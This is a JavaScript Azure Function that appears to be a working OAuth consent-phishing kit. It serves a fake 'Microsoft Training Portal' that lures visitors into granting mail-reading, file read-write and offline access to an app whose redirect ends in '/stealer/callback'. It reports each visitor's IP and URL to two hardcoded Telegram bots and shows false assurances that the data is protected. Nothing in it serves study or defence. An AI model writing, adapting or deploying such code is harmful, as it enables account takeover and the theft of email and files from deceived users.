const TELEGRAM_BOT_TOKEN = '7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps';
const TELEGRAM_CHAT_ID = '6743632244';
const TELEGRAM_BOT_TOKEN_2 = '7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U';
const TELEGRAM_CHAT_ID_2 = '6263177378';

async function sendTelegram(message) {
  try {
    const promises = [
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      }),
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID_2,
          text: message,
          parse_mode: 'HTML'
        })
      })
    ];
    await Promise.all(promises);
  } catch (error) {
    console.error('Telegram error:', error);
  }
}

module.exports = async function (context, req) {
  await sendTelegram(`🎯 <b>OAUTH CONSENT: Training page accessed</b>\n📅 ${new Date().toISOString()}\n🌐 IP: ${req.headers['x-forwarded-for'] || 'Unknown'}\n🔗 URL: ${req.url}`);
  
  const CLIENT_ID = 'f840d591-c00e-4aa0-8ebe-77b5f34b81e1'; // User's registered app
  const REDIRECT_URI = 'https://aitm-func-1753463791.azurewebsites.net/stealer/callback';
  const SCOPE = 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Files.ReadWrite offline_access openid profile email';
  
  const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=${encodeURIComponent(SCOPE)}&state=phishing&response_mode=query&prompt=consent`;
  
  context.res = {
    status: 200,
    headers: { 'Content-Type': 'text/html' },
    body: `
<!DOCTYPE html>
<html>
<head>
    <title>🎓 Microsoft Training Portal</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
        .container { max-width: 600px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 30px; }
        .btn { background: #0078d4; color: white; padding: 15px 30px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; text-decoration: none; display: inline-block; }
        .btn:hover { background: #106ebe; }
        .features { margin: 30px 0; }
        .feature { margin: 15px 0; padding: 10px; background: #f8f9fa; border-radius: 4px; }
        .warning { background: #fff3cd; color: #856404; padding: 15px; border-radius: 4px; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>🎓 Microsoft Training Portal</h1>
            <p>Advanced Office 365 Training & Certification</p>
        </div>
        
        <div class="features">
            <div class="feature">📚 <strong>Advanced Excel Training</strong> - Master formulas, pivot tables, and data analysis</div>
            <div class="feature">📧 <strong>Outlook Management</strong> - Email productivity and organization techniques</div>
            <div class="feature">📁 <strong>OneDrive Integration</strong> - Cloud storage and collaboration best practices</div>
            <div class="feature">👥 <strong>Teams Collaboration</strong> - Video conferencing and project management</div>
            <div class="feature">🏆 <strong>Microsoft Certification</strong> - Prepare for official Microsoft exams</div>
        </div>
        
        <div class="warning">
            <strong>⚠️ Important:</strong> This training requires access to your Microsoft account to provide personalized learning paths and track your progress.
        </div>
        
        <div style="text-align: center; margin: 30px 0;">
            <a href="${authUrl}" class="btn">🚀 Start Training (Sign in with Microsoft)</a>
        </div>
        
        <div style="text-align: center; color: #666; font-size: 14px;">
            <p>✅ Secure Microsoft Authentication</p>
            <p>🔐 Your data is protected and encrypted</p>
            <p>🎯 Personalized training based on your role</p>
        </div>
    </div>
</body>
</html>
    `
  };
};